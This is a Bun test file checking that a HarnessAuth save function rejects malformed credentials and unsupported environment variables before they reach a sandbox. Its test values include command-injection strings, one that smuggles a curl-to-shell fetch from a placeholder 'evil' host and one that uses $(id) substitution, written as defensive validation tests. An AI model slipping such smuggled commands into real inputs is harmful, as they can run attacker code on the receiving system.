import { expect, test } from "bun:test";
import { save } from "./HarnessAuth.ts";

test("hostile credentials and env names are rejected before reaching the sandbox", () => {
  for (const value of ["x;curl evil|sh", "a b", "x'$(id)'", "short"])
    expect(() => save({ harness: "claude", kind: "apiKey", value })).toThrow("doesn't look like");

  expect(() =>
    save({ harness: "pi", envVar: "NODE_OPTIONS", value: "sk-or-v1-abcdef123456" }),
  ).toThrow("unsupported provider");
});
